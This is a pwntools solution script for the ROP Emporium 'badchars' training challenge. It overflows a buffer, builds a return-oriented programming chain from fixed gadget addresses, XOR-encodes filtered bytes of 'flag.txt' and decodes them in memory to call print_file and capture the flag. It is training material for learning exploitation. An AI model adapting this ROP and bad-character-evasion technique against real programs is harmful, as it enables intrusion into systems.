from pwn import *

path=b'flag.txt'
bad_char=b'xga.'
xor_byte=b'\x80'

gad_write_pop=p64(0x40069c)
gad_write=p64(0x400634)

gad_modify_pop=p64(0x4006a0)
gad_modify_xor=p64(0x400628)

gad_print_pop=p64(0x4006a3)
plt_print_file = p64(0x400510)

# note this can't choose the beginning of .data as before because the address+4 will has a
# badchar `\x2e` aka `.`
addr_data=p64(0x601030)

def modi_char(addr, byte):
    return gad_modify_pop + p64(u8(byte)) + addr + gad_modify_xor

def xor_path(path, byte):
    res=b''
    for i in path:
        if i in bad_char:
            res += p8(i ^ u8(byte))
        else:
            res += p8(i)
    return res

# convert string with xor
fake_path=xor_path(path, xor_byte)

pay = b'X' * 40
# write string to .data
pay += gad_write_pop + fake_path + addr_data
# padding also can be used for gadget
pay += p64(0xa5) * 2
pay += gad_write

# convert path back
pay += modi_char(p64(u64(addr_data) + 2), xor_byte)
pay += modi_char(p64(u64(addr_data) + 3), xor_byte)
pay += modi_char(p64(u64(addr_data) + 4), xor_byte)
pay += modi_char(p64(u64(addr_data) + 6), xor_byte)

# write file
pay += gad_print_pop + addr_data
pay += plt_print_file

#  j=0
#  print("len %d" % len(pay))
# important to check if has bad char
#  for i in pay:
#      j+=1
#      if i in bad_char:
#          print("found bad char %x, posi: %d" % (i, j))
#
#  sys.stdout.buffer.write(pay)

elf = ELF('badchars')
p = process(elf.path)
p.sendline(pay)
response = p.recvall()

print(response.decode())

flag = re.findall("ROPE{.*?}", response.decode())

if flag:
    #  print(flag[0])
    print("[-] Get flag!")
    success(flag[0])




